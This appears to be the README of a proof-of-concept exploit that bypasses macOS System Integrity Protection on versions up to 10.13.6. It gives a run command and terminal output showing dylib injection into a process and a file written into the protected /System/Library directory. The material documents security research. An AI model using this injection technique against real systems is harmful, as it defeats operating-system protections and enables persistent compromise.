# macOS up to 10.13.6 SIP bypass

`make run`

Note that this requires administrative privilege.

```
➜  bin ls
Toolchains      bootstrap.dylib eop.dylib       sip.dylib       symbols         taytay          test
➜  bin csrutil status
System Integrity Protection status: enabled.
➜  bin file /System/Library/sip.txt
/System/Library/sip.txt: cannot open `/System/Library/sip.txt' (No such file or directory)
➜  bin sudo ./test
Password:
[xianzhi] taytay pid: 653

sleep
[xianzhi] module: 0x7fcef043c1f0

[xianzhi] bootstrapfn: 0x1002b7d90

[xianzhi] pid: 632
mach_inject: found threadEntry image at: 0x1002b7000 with size: 9544
[xianzhi] inject dylib returns 0
➜  bin file /System/Library/sip.txt
/System/Library/sip.txt: ASCII text, with no line terminators
➜  bin cat /System/Library/sip.txt
hello%
```
